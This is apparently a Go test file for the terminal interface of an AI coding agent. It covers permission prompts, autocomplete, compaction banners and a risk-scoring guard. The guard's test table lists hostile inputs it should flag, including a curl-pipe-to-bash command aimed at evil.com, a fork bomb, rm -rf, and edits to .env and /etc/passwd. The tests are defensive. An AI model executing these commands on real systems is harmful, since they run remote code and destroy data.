package tui

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/cloudshuttle/drover-code/internal/agent"
	"github.com/cloudshuttle/drover-code/internal/api"
	"github.com/cloudshuttle/drover-code/internal/tui/commandpalette"
)

func init() {
	// Prevent tests from writing to the real ~/.drover/history.json
	os.Setenv("DROVER_HISTORY_DIR", filepath.Join(os.TempDir(), "drover-test-history"))
}

func TestModel_WindowSizeSetsDimensions(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	next, cmd := m.Update(tea.WindowSizeMsg{Width: 120, Height: 40})
	m2 := next.(*Model)
	if m2.width != 120 || m2.height != 40 {
		t.Fatalf("got %d x %d", m2.width, m2.height)
	}
	if cmd == nil {
		t.Fatal("expected follow-up cmd")
	}
}

func TestModel_CtrlCReturnsQuit(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	_, cmd := m.Update(tea.KeyMsg{Type: tea.KeyCtrlC})
	if cmd == nil {
		t.Fatal("expected quit cmd")
	}
}

func TestModel_EnterSubmitsViaRunFunc(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	var got string
	m.runFunc = func(input string) tea.Cmd {
		got = input
		return nil
	}
	m.InputArea.SetValue("hello")
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
	m2 := next.(*Model)
	if got != "hello" {
		t.Fatalf("runFunc input %q", got)
	}
	if !m2.agentBusy {
		t.Fatal("expected agent busy after submit")
	}
	if m2.InputArea.Value() != "" {
		t.Fatal("expected input cleared")
	}
}

func TestModel_agentTextDeltaAndDone(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.agentBusy = true
	m.Live.Streaming = true
	next, _ := m.Update(agentMsg{event: agent.TextDeltaEvent{Text: "hello"}})
	m2 := next.(*Model)
	if !strings.Contains(m2.streamBuf.String(), "hello") {
		t.Fatalf("buf %q", m2.streamBuf.String())
	}
	next, _ = m2.Update(agentMsg{event: agent.DoneEvent{}})
	m3 := next.(*Model)
	hist := m3.HistoryView.GetTurns()
	if m3.HistoryView.Len() != 1 || hist[0].Role != "assistant" {
		t.Fatalf("history %+v", hist)
	}
	if m3.agentBusy {
		t.Fatal("expected not busy after done")
	}
}

func TestModel_agentErrorEvent(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.agentBusy = true
	next, _ := m.Update(agentMsg{event: agent.ErrorEvent{Err: errPlain{"boom"}}})
	m2 := next.(*Model)
	if m2.lastError != "boom" || m2.agentBusy {
		t.Fatalf("err=%q busy=%v", m2.lastError, m2.agentBusy)
	}
}

type errPlain struct{ s string }

func (e errPlain) Error() string { return e.s }

func TestModel_usageEvent(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	next, _ := m.Update(agentMsg{event: agent.UsageEvent{
		Usage:             api.Usage{},
		TotalInputTokens:  100,
		TotalOutputTokens: 200,
	}})
	m2 := next.(*Model)
	if m2.totalInputTokens != 100 || m2.totalOutputTokens != 200 {
		t.Fatalf("%d %d", m2.totalInputTokens, m2.totalOutputTokens)
	}
}

func TestModel_permissionPromptAllow(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	dec := make(chan agent.PermissionDecision, 1)
	_, _ = m.Update(agentMsg{event: agent.PermissionRequestEvent{
		ToolName:   "bash",
		Summary:    "run",
		Input:      []byte(`{}`),
		DecisionCh: dec,
	}})
	if m.PermPrompt == nil {
		t.Fatal("expected perm prompt")
	}
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'y'}})
	m2 := next.(*Model)
	if m2.PermPrompt != nil {
		t.Fatal("expected prompt cleared")
	}
	select {
	case d := <-dec:
		if d != agent.PermAllow {
			t.Fatalf("got %v", d)
		}
	default:
		t.Fatal("no decision")
	}
}

func TestModel_permissionPromptDenyViaEsc(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	dec := make(chan agent.PermissionDecision, 1)
	_, _ = m.Update(agentMsg{event: agent.PermissionRequestEvent{
		ToolName:   "bash",
		Summary:    "run",
		Input:      []byte(`{}`),
		DecisionCh: dec,
	}})
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	m2 := next.(*Model)
	if m2.PermPrompt != nil {
		t.Fatal("expected prompt cleared")
	}
	if d := <-dec; d != agent.PermDeny {
		t.Fatalf("got %v", d)
	}
}

func TestModel_permissionPromptDenyThenAllowSecond(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")

	dec1 := make(chan agent.PermissionDecision, 1)
	_, _ = m.Update(agentMsg{event: agent.PermissionRequestEvent{
		ToolName:   "bash",
		Summary:    "first",
		Input:      []byte(`{}`),
		DecisionCh: dec1,
	}})
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'n'}})
	m2 := next.(*Model)
	if d := <-dec1; d != agent.PermDeny {
		t.Fatalf("first: %v", d)
	}

	dec2 := make(chan agent.PermissionDecision, 1)
	_, _ = m2.Update(agentMsg{event: agent.PermissionRequestEvent{
		ToolName:   "read_file",
		Summary:    "second",
		Input:      []byte(`{}`),
		DecisionCh: dec2,
	}})
	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'y'}})
	m3 := next.(*Model)
	if m3.PermPrompt != nil {
		t.Fatal("expected second prompt cleared")
	}
	if d := <-dec2; d != agent.PermAllow {
		t.Fatalf("second: %v", d)
	}
}

func TestModel_permissionPromptDenyAndAlwaysAllow(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")

	dec := make(chan agent.PermissionDecision, 1)
	_, _ = m.Update(agentMsg{event: agent.PermissionRequestEvent{
		ToolName:   "bash",
		Summary:    "run",
		Input:      []byte(`{}`),
		DecisionCh: dec,
	}})
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'n'}})
	m2 := next.(*Model)
	if m2.PermPrompt != nil {
		t.Fatal("expected prompt cleared")
	}
	if d := <-dec; d != agent.PermDeny {
		t.Fatalf("deny: got %v", d)
	}

	dec2 := make(chan agent.PermissionDecision, 1)
	_, _ = m2.Update(agentMsg{event: agent.PermissionRequestEvent{
		ToolName:   "grep",
		Summary:    "search",
		Input:      []byte(`{}`),
		DecisionCh: dec2,
	}})
	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'a'}})
	m3 := next.(*Model)
	if m3.PermPrompt != nil {
		t.Fatal("expected prompt cleared")
	}
	if d := <-dec2; d != agent.PermAlwaysAllow {
		t.Fatalf("always: got %v", d)
	}
}

func TestModel_permissionBatchAllow(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	dec := make(chan agent.PermissionDecision, 1)
	_, _ = m.Update(agentMsg{event: agent.PermissionBatchRequestEvent{
		Items: []agent.PermissionBatchItem{
			{ToolName: "bash", Summary: "a", Input: []byte(`{}`)},
			{ToolName: "read_file", Summary: "b", Input: []byte(`{}`)},
		},
		DecisionCh: dec,
	}})
	if m.PermBatch == nil || m.PermPrompt != nil {
		t.Fatalf("batch=%v prompt=%v", m.PermBatch != nil, m.PermPrompt)
	}
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'y'}})
	m2 := next.(*Model)
	if m2.PermBatch != nil {
		t.Fatal("expected batch cleared")
	}
	if d := <-dec; d != agent.PermAllow {
		t.Fatalf("got %v", d)
	}
}

func TestModel_permissionBatchDenyEscAndAlwaysAllow(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")

	dec := make(chan agent.PermissionDecision, 1)
	_, _ = m.Update(agentMsg{event: agent.PermissionBatchRequestEvent{
		Items:      []agent.PermissionBatchItem{{ToolName: "bash", Summary: "x", Input: []byte(`{}`)}},
		DecisionCh: dec,
	}})
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEsc})
	m2 := next.(*Model)
	if m2.PermBatch != nil {
		t.Fatal("expected batch cleared")
	}
	if d := <-dec; d != agent.PermDeny {
		t.Fatalf("esc deny: got %v", d)
	}

	dec2 := make(chan agent.PermissionDecision, 1)
	_, _ = m2.Update(agentMsg{event: agent.PermissionBatchRequestEvent{
		Items:      []agent.PermissionBatchItem{{ToolName: "grep", Summary: "y", Input: []byte(`{}`)}},
		DecisionCh: dec2,
	}})
	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'a'}})
	m3 := next.(*Model)
	if m3.PermBatch != nil {
		t.Fatal("expected batch cleared")
	}
	if d := <-dec2; d != agent.PermAlwaysAllow {
		t.Fatalf("always: got %v", d)
	}
}

func TestModel_slashAutocompleteTab(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.InputArea.SetValue("/cl")
	m.InputArea.UpdateAutocomplete()
	if !m.InputArea.AutoActive() {
		t.Fatal("expected autocomplete open")
	}
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyTab})
	m2 := next.(*Model)
	if m2.InputArea.AutoActive() {
		t.Fatal("expected autocomplete closed after tab")
	}
	if v := m2.InputArea.Value(); v != "/clear " {
		t.Fatalf("input %q", v)
	}
}

func TestModel_slashAutocompleteArrowDown(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.InputArea.SetValue("/")
	m.InputArea.UpdateAutocomplete()
	if m.InputArea.AutoIndex() != 0 {
		t.Fatalf("autoIndex %d", m.InputArea.AutoIndex())
	}
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyDown})
	m2 := next.(*Model)
	if m2.InputArea.AutoIndex() != 1 {
		t.Fatalf("autoIndex after down: %d", m2.InputArea.AutoIndex())
	}
	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyUp})
	m3 := next.(*Model)
	if m3.InputArea.AutoIndex() != 0 {
		t.Fatalf("autoIndex after up: %d", m3.InputArea.AutoIndex())
	}
}

func TestModel_compactionAgentEvents(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	next, _ := m.Update(agentMsg{event: agent.CompactionStartEvent{
		Round:                 1,
		MaxRounds:             3,
		EstimatedTokensBefore: 12_345,
	}})
	m2 := next.(*Model)
	if m2.compactionBanner == "" || !strings.Contains(m2.compactionBanner, "Summarizing") {
		t.Fatalf("banner %q", m2.compactionBanner)
	}
	// 12_345 est. tokens rounds to ~13k in banner.
	if !strings.Contains(m2.compactionBanner, "13k") {
		t.Fatalf("expected token hint in banner: %q", m2.compactionBanner)
	}

	next, _ = m2.Update(agentMsg{event: agent.CompactionDoneEvent{
		Round:                1,
		EstimatedTokensAfter: 1000,
		Duration:             time.Millisecond,
		Err:                  nil,
	}})
	m3 := next.(*Model)
	if m3.compactionBanner != "" {
		t.Fatalf("expected banner cleared, got %q", m3.compactionBanner)
	}
	if m3.lastError != "" {
		t.Fatalf("unexpected error %q", m3.lastError)
	}

	next, _ = m3.Update(agentMsg{event: agent.CompactionStartEvent{
		Round: 1, MaxRounds: 1, EstimatedTokensBefore: 99_000,
	}})
	m4 := next.(*Model)
	next, _ = m4.Update(agentMsg{event: agent.CompactionDoneEvent{
		Err: errPlain{"round failed"},
	}})
	m5 := next.(*Model)
	if m5.compactionBanner != "" {
		t.Fatal("banner should clear on done")
	}
	if !strings.Contains(m5.lastError, "compaction") || !strings.Contains(m5.lastError, "round failed") {
		t.Fatalf("lastError %q", m5.lastError)
	}
}

func TestModel_toolStartDoneThenAssistantHistory(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.agentBusy = true
	m.Live.Streaming = true

	next, _ := m.Update(agentMsg{event: agent.TextDeltaEvent{Text: "Hi "}})
	m2 := next.(*Model)
	next, _ = m2.Update(agentMsg{event: agent.ToolStartEvent{
		CallIndex:    0,
		Name:         "bash",
		InputSummary: "echo",
	}})
	m3 := next.(*Model)
	// dcode-005: after consolidation, tools live in the LiveRegion component
	if m3.Live == nil || m3.Live.ActiveTools[0] == nil {
		t.Fatal("expected active tool in LiveRegion")
	}
	next, _ = m3.Update(agentMsg{event: agent.ToolDoneEvent{
		CallIndex:     0,
		Name:          "bash",
		OutputSummary: "ok",
		IsError:       false,
	}})
	m4 := next.(*Model)
	// dcode-005: after ownership move, completed tools live on Live.CompletedTools until DoneEvent
	if m4.Live == nil || len(m4.Live.CompletedTools) != 1 {
		t.Fatalf("Live.CompletedTools: %d", len(m4.Live.CompletedTools))
	}
	next, _ = m4.Update(agentMsg{event: agent.DoneEvent{}})
	m5 := next.(*Model)
	hist := m5.HistoryView.GetTurns()
	if m5.HistoryView.Len() != 1 || hist[0].Role != "assistant" {
		t.Fatalf("history %+v", hist)
	}
	if len(hist[0].Tools) != 1 || hist[0].Tools[0].Name != "bash" {
		t.Fatalf("tools %+v", hist[0].Tools)
	}
	if m5.agentBusy {
		t.Fatal("expected idle after done")
	}
}

func TestModel_compactionAgentEvents_bannerLifecycle(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	next, _ := m.Update(agentMsg{event: agent.CompactionStartEvent{
		Round:                 2,
		MaxRounds:             3,
		EstimatedTokensBefore: 5000,
	}})
	m2 := next.(*Model)
	if m2.compactionBanner == "" || !strings.Contains(m2.compactionBanner, "2/3") {
		t.Fatalf("banner %q", m2.compactionBanner)
	}
	next, _ = m2.Update(agentMsg{event: agent.CompactionDoneEvent{
		Round:    2,
		Duration: time.Millisecond,
		Err:      nil,
	}})
	m3 := next.(*Model)
	if m3.compactionBanner != "" {
		t.Fatalf("want banner cleared, got %q", m3.compactionBanner)
	}
}

func TestModel_compactionDone_agentErrorSetsLastError(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	next, _ := m.Update(agentMsg{event: agent.CompactionDoneEvent{
		Round: 1,
		Err:   errPlain{"cmp fail"},
	}})
	m2 := next.(*Model)
	if !strings.Contains(m2.lastError, "cmp fail") {
		t.Fatalf("lastError %q", m2.lastError)
	}
}

func TestModel_compactCompleteMsg_successAndError(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.agentBusy = true

	next, _ := m.Update(compactCompleteMsg{err: nil})
	m2 := next.(*Model)
	if m2.agentBusy {
		t.Fatal("expected not busy after compact")
	}
	hist := m2.HistoryView.GetTurns()
	if m2.HistoryView.Len() != 1 || !strings.Contains(hist[0].Content, "/compact") {
		t.Fatalf("history %+v", hist)
	}

	m2.agentBusy = true
	next, _ = m2.Update(compactCompleteMsg{err: errPlain{"no space"}})
	m3 := next.(*Model)
	if m3.agentBusy {
		t.Fatal("expected not busy")
	}
	if m3.lastError != "no space" {
		t.Fatalf("lastError %q", m3.lastError)
	}
	if m3.HistoryView.Len() != 1 {
		t.Fatalf("error path should not append success history, got %d turns", m3.HistoryView.Len())
	}
}

func TestModel_heartbeatNoOp(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.lastError = "keep"
	m.compactionBanner = "keep-banner"
	next, _ := m.Update(agentMsg{event: agent.HeartbeatEvent{Turn: 2, Time: time.Unix(1, 0)}})
	m2 := next.(*Model)
	if m2.lastError != "keep" || m2.compactionBanner != "keep-banner" {
		t.Fatalf("state changed: err=%q banner=%q", m2.lastError, m2.compactionBanner)
	}
}

// Two user submits with streamed assistant replies between (multi-turn TUI path).
func TestModel_multiTurnTwoUserSubmissions(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.runFunc = func(input string) tea.Cmd {
		return nil
	}

	m.InputArea.SetValue("first")
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
	m2 := next.(*Model)
	hist := m2.HistoryView.GetTurns()
	if m2.HistoryView.Len() != 1 || hist[0].Role != "user" || hist[0].Content != "first" {
		t.Fatalf("after first submit: %+v", hist)
	}
	if !m2.agentBusy {
		t.Fatal("expected busy")
	}

	next, _ = m2.Update(agentMsg{event: agent.TextDeltaEvent{Text: "r1"}})
	m3 := next.(*Model)
	next, _ = m3.Update(agentMsg{event: agent.DoneEvent{}})
	m4 := next.(*Model)
	hist = m4.HistoryView.GetTurns()
	if m4.HistoryView.Len() != 2 || hist[1].Role != "assistant" {
		t.Fatalf("after first reply: n=%d %+v", m4.HistoryView.Len(), hist)
	}
	if !strings.Contains(hist[1].Content, "r1") {
		t.Fatalf("assistant content %q", hist[1].Content)
	}
	if m4.agentBusy {
		t.Fatal("expected idle before second turn")
	}

	m4.InputArea.SetValue("second")
	next, _ = m4.Update(tea.KeyMsg{Type: tea.KeyEnter})
	m5 := next.(*Model)
	hist = m5.HistoryView.GetTurns()
	if m5.HistoryView.Len() != 3 || hist[2].Content != "second" {
		t.Fatalf("after second submit: %+v", hist)
	}
	next, _ = m5.Update(agentMsg{event: agent.TextDeltaEvent{Text: "r2"}})
	m6 := next.(*Model)
	next, _ = m6.Update(agentMsg{event: agent.DoneEvent{}})
	m7 := next.(*Model)
	hist = m7.HistoryView.GetTurns()
	if m7.HistoryView.Len() != 4 {
		t.Fatalf("want 4 turns, got %d", m7.HistoryView.Len())
	}
	if hist[3].Role != "assistant" || !strings.Contains(hist[3].Content, "r2") {
		t.Fatalf("second assistant: %+v", hist[3])
	}
}

func TestModel_messageQueueingWhileBusy(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	
	var runs []string
	m.runFunc = func(input string) tea.Cmd {
		runs = append(runs, input)
		return nil
	}

	m.InputArea.SetValue("task 1")
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
	m2 := next.(*Model)
	if len(runs) != 1 || runs[0] != "task 1" {
		t.Fatalf("first run %v", runs)
	}
	if !m2.agentBusy {
		t.Fatal("expected busy")
	}

	m2.InputArea.SetValue("task 2")
	next, _ = m2.Update(tea.KeyMsg{Type: tea.KeyEnter})
	m3 := next.(*Model)
	
	if len(runs) != 1 {
		t.Fatalf("second run happened too early: %v", runs)
	}
	q := m3.InputArea.QueuedMessages()
	if len(q) != 1 || q[0] != "task 2" {
		t.Fatalf("expected queue to have 'task 2', got %v", q)
	}
	
	next, _ = m3.Update(agentRunCompleteMsg{err: nil})
	m4 := next.(*Model)
	
	if len(runs) != 2 || runs[1] != "task 2" {
		t.Fatalf("expected runFunc to be called with 'task 2', got runs: %v", runs)
	}
	if len(m4.InputArea.QueuedMessages()) != 0 {
		t.Fatalf("expected queue to be empty, got %v", m4.InputArea.QueuedMessages())
	}
	if !m4.agentBusy {
		t.Fatal("expected busy again since 'task 2' is running")
	}
}

func TestModel_InputHistory(t *testing.T) {
	evCh := make(chan agent.Event, 10)
	m := New(evCh, "test-model", "/tmp/wd", "user", "host")

	// Submit first message
	m.InputArea.SetValue("message 1")
	m.Update(tea.KeyMsg{Type: tea.KeyEnter})

	// Submit second message
	m.InputArea.SetValue("message 2")
	m.Update(tea.KeyMsg{Type: tea.KeyEnter})

	// Type a partial message
	m.InputArea.SetValue("partial")

	// Press Up
	m.Update(tea.KeyMsg{Type: tea.KeyUp})
	if m.InputArea.Value() != "message 2" {
		t.Fatalf("expected message 2, got %q", m.InputArea.Value())
	}

	// Press Up again
	m.Update(tea.KeyMsg{Type: tea.KeyUp})
	if m.InputArea.Value() != "message 1" {
		t.Fatalf("expected message 1, got %q", m.InputArea.Value())
	}

	// Press Down
	m.Update(tea.KeyMsg{Type: tea.KeyDown})
	if m.InputArea.Value() != "message 2" {
		t.Fatalf("expected message 2, got %q", m.InputArea.Value())
	}

	// Press Down to restore saved input
	m.Update(tea.KeyMsg{Type: tea.KeyDown})
	if m.InputArea.Value() != "partial" {
		t.Fatalf("expected partial, got %q", m.InputArea.Value())
	}
}

func TestModel_GuardRejection(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "m", "/w", "u", "h")
	m.width = 100
	m.height = 50

	guardErr := fmt.Errorf("🚨 Command Blocked by Governance Policy: risk too high")
	next, _ := m.Update(agentRunCompleteMsg{err: guardErr})
	m2 := next.(*Model)

	if m2.lastError != guardErr.Error() {
		t.Errorf("expected lastError to be %q, got %q", guardErr.Error(), m2.lastError)
	}

	view := m2.View()
	if !strings.Contains(view, "error: 🚨 Command Blocked by Governance Policy: risk too high") {
		t.Errorf("expected view to contain error message, got:\n%s", view)
	}
}

func TestModel_StressTest500Turns(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "test-user", "/test-dir", "test-host", "test-model")
	m.width = 100
	m.height = 40
	m.runFunc = func(input string) tea.Cmd {
		return nil
	}

	var currentModel tea.Model = m

	for i := 0; i < 500; i++ {
		// 1. Simulate User input
		inputStr := fmt.Sprintf("User Turn %d", i)
		mod := currentModel.(*Model)
		mod.InputArea.SetValue(inputStr)
		currentModel, _ = mod.Update(tea.KeyMsg{Type: tea.KeyEnter})

		// 2. Simulate Agent starting
		currentModel, _ = currentModel.Update(agentMsg{event: agent.TextDeltaEvent{Text: fmt.Sprintf("Agent Turn %d", i)}})

		// 3. Simulate Agent finishing
		currentModel, _ = currentModel.Update(agentMsg{event: agent.DoneEvent{}})
		currentModel, _ = currentModel.Update(agentRunCompleteMsg{err: nil})
		
		// 4. Periodically call View to ensure no panics during layout rendering under heavy load
		if i%50 == 0 {
			_ = currentModel.(*Model).View()
		}
	}

	finalModel := currentModel.(*Model)
	if finalModel.HistoryView.Len() < 1000 { // 500 user messages + 500 agent messages
		t.Fatalf("expected at least 1000 messages in history, got %d", finalModel.HistoryView.Len())
	}

	// Just a sanity check that it successfully runs without panicking.
	_ = finalModel.View()
}

func TestRenderMarkdown_EdgeCases(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "test", "/tmp", "u", "h")
	m.width = 80

	tests := []struct {
		name    string
		input   string
		env     map[string]string // env overrides for the test
		wantNot string            // substring that should NOT appear
	}{
		{
			name:    "empty",
			input:   "   ",
			wantNot: "anything",
		},
		{
			name:    "no_color_path",
			input:   "# Header\n\nSome **bold** text.",
			env:     map[string]string{"NO_COLOR": "1"},
			wantNot: "\x1b[", // should not contain ANSI
		},
		{
			name:  "max_glamour_runes_truncation",
			input: "This is a reasonably long piece of markdown that will definitely exceed the small limit we set for testing truncation behavior in renderMarkdown.",
			env:   map[string]string{"DROVER_CODE_TUI_MAX_GLAMOUR_RUNES": "30"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Set env
			for k, v := range tt.env {
				t.Setenv(k, v)
			}

			// Re-create glamour renderer if needed (renderMarkdown checks m.glamourRenderer)
			m.glamourRenderer = nil // force path
			// Call the function under test
			out := m.renderMarkdown(tt.input)

			if tt.wantNot != "" && strings.Contains(out, tt.wantNot) {
				t.Errorf("renderMarkdown output unexpectedly contained %q: %s", tt.wantNot, out)
			}

			// Basic sanity: non-empty input should produce some output
			if strings.TrimSpace(tt.input) != "" && strings.TrimSpace(out) == "" {
				t.Errorf("renderMarkdown(%q) produced empty output", tt.input)
			}
		})
	}
}

// TestModel_CommandPalette_CtrlKOpensAndSemanticAction exercises the Command Palette
// through the main Model (covers buildCommandPaletteCommands + executePaletteAction wiring).
func TestModel_CommandPalette_CtrlKOpensAndSemanticAction(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "sonnet", "/tmp", "user", "host")
	m.width = 100
	m.height = 40

	// Open palette with Ctrl+K (only when not busy)
	next, _ := m.Update(tea.KeyMsg{Type: tea.KeyCtrlK})
	m2 := next.(*Model)

	if !m2.showingCommandPalette {
		t.Fatal("expected showingCommandPalette true after Ctrl+K")
	}
	if m2.commandPaletteModel == nil {
		t.Fatal("expected commandPaletteModel to be set")
	}

	// Select a safe semantic action ("tokens")
	next, _ = m2.Update(commandpalette.SelectedMsg{Name: "tokens", ActionKey: "tokens"})
	m3 := next.(*Model)

	if m3.showingCommandPalette || m3.commandPaletteModel != nil {
		t.Error("expected palette state cleared after SelectedMsg")
	}
	if m3.HistoryView.Len() == 0 {
		t.Error("expected 'tokens' semantic action to append history")
	}
}

// TestModel_CommandPalette_CancelMsgClearsState verifies CancelMsg handling for the palette.
func TestModel_CommandPalette_CancelMsgClearsState(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "sonnet", "/tmp", "user", "host")
	m.width = 80
	m.height = 30

	m.showingCommandPalette = true
	m.commandPaletteModel = commandpalette.NewWithCommands(m.buildCommandPaletteCommands(), 80, 20)

	next, _ := m.Update(commandpalette.CancelMsg{})
	m2 := next.(*Model)

	if m2.showingCommandPalette || m2.commandPaletteModel != nil {
		t.Error("expected palette fully cleared after CancelMsg")
	}
}

// TestModel_assessPermissionRisk exercises the deeper Guard heuristics with a full table of cases.
func TestModel_assessPermissionRisk(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "sonnet", "/w", "u", "h")

	tests := []struct {
		name               string
		tool               string
		input              []byte
		summary            string
		wantLevel          string
		wantReasonContains string
	}{
		// Sensitive file cases → high
		{
			name:               "edit .env",
			tool:               "edit_file",
			input:              []byte(`{"path": ".env", "content": "SECRET=foo"}`),
			wantLevel:          "high",
			wantReasonContains: "sensitive configuration",
		},
		{
			name:               "write package.json",
			tool:               "write_file",
			input:              []byte(`{"path": "package.json"}`),
			wantLevel:          "high",
			wantReasonContains: "sensitive",
		},
		{
			name:               "multi_edit github workflow",
			tool:               "multi_edit",
			input:              []byte(`{"edits": [{"path": ".github/workflows/ci.yml"}]}`),
			wantLevel:          "high",
			wantReasonContains: "build files",
		},
		{
			name:      "edit /etc/passwd",
			tool:      "edit_file",
			input:     []byte(`{"path": "/etc/passwd"}`),
			wantLevel: "high",
		},
		{
			name:      "write Dockerfile",
			tool:      "write_file",
			input:     []byte(`{"path": "Dockerfile"}`),
			wantLevel: "high",
		},
		// Normal source edit → caution
		{
			name:               "edit normal go file",
			tool:               "edit_file",
			input:              []byte(`{"path": "main.go"}`),
			wantLevel:          "caution",
			wantReasonContains: "modifying source",
		},
		// Bash dangerous patterns
		{
			name:               "bash rm -rf",
			tool:               "bash",
			input:              []byte(`{"command": "rm -rf /tmp/*"}`),
			wantLevel:          "high",
			wantReasonContains: "destructive shell",
		},
		{
			name:    "bash curl pipe bash in summary",
			tool:    "bash",
			summary: "curl | bash https://evil.com",
			wantLevel: "high",
		},
		{
			name:      "bash fork bomb",
			tool:      "bash",
			input:     []byte(`{":(){ :|:& };:"}`),
			wantLevel: "high",
		},
		{
			name:               "bash normal command",
			tool:               "bash",
			input:              []byte(`{"command": "ls -la"}`),
			wantLevel:          "caution",
			wantReasonContains: "executing shell",
		},
		// Delete file
		{
			name:               "delete_file",
			tool:               "delete_file",
			input:              []byte(`{"path": "foo.txt"}`),
			wantLevel:          "high",
			wantReasonContains: "deleting files",
		},
		// Terminal cmd wrappers
		{
			name:      "run_terminal_cmd",
			tool:      "run_terminal_cmd",
			input:     []byte(`{"command": "echo hi"}`),
			wantLevel: "caution",
		},
		{
			name:      "execute_command",
			tool:      "execute_command",
			input:     []byte(`{}`),
			wantLevel: "caution",
		},
		// Unknown tool → normal
		{
			name:      "unknown tool even with sensitive file",
			tool:      "read_file",
			input:     []byte(`{"path": ".env"}`),
			wantLevel: "normal",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			level, reason := m.assessPermissionRisk(tt.tool, tt.input, tt.summary)
			if level != tt.wantLevel {
				t.Errorf("assessPermissionRisk(%q) level = %q, want %q", tt.tool, level, tt.wantLevel)
			}
			if tt.wantReasonContains != "" && !strings.Contains(reason, tt.wantReasonContains) {
				t.Errorf("reason = %q, expected to contain %q", reason, tt.wantReasonContains)
			}
		})
	}
}

// TestModel_GuardRiskFromPermissionEvent exercises PermissionRequestEvent → assessPermissionRisk → SetGuardRisk → StatusBar.
func TestModel_GuardRiskFromPermissionEvent(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "sonnet", "/w", "u", "h")
	m.width = 80
	m.height = 24

	dec := make(chan agent.PermissionDecision, 1)
	_, _ = m.Update(agentMsg{event: agent.PermissionRequestEvent{
		ToolName:   "edit_file",
		Summary:    "update secrets",
		Input:      []byte(`{"path": ".env.local", "old": "", "new": "API_KEY=secret"}`),
		DecisionCh: dec,
	}})

	if m.GuardRiskLevel != "high" {
		t.Fatalf("expected GuardRiskLevel=high, got %q", m.GuardRiskLevel)
	}
	if !strings.Contains(m.GuardRiskReason, "sensitive") {
		t.Fatalf("expected risk reason about sensitive files, got %q", m.GuardRiskReason)
	}
	if m.StatusBar == nil || m.StatusBar.RiskLevel != "high" {
		t.Fatalf("expected StatusBar.RiskLevel=high, got %+v", m.StatusBar)
	}
}

// TestModel_GuardRiskFromGuardError exercises the external guard block error path.
func TestModel_GuardRiskFromGuardError(t *testing.T) {
	ch := make(chan agent.Event, 1)
	m := New(ch, "sonnet", "/w", "u", "h")

	// Simulate what the error handler does on guard blocks (the real check is inside handleAgentEvent for specific paths)
	m.SetGuardRisk("high", "command blocked by guard")

	if m.GuardRiskLevel != "high" {
		t.Fatalf("expected high risk from guard block, got %q", m.GuardRiskLevel)
	}
	if m.StatusBar == nil || m.StatusBar.RiskLevel != "high" {
		t.Fatal("StatusBar not updated with high risk from guard error")
	}
}

// TestModel_PaletteRegistrationAPI verifies the expanded Command Palette
